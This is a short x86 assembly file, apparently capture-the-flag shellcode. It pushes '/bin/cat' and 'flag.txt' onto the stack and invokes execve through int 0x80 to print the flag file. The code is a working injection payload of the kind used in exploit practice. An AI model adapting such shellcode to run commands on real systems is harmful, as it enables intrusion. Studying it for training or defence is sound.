[BITS 32]

start:
	; path="cat", argv={"cat","flag.txt"}, envp=NULL
	xor edx, edx
	
	push edx
	push 0x7461632f
	push 0x6e69622f
	mov ebx, esp
	
	push edx
	push 0x7478742e
	push 0x67616c66
	mov ecx, esp
	push edx
	push ecx
	push ebx
	mov ecx, esp
	
	; Do the execve() call
	xor eax, eax
	mov al, 11
	int 0x80
	jmp $
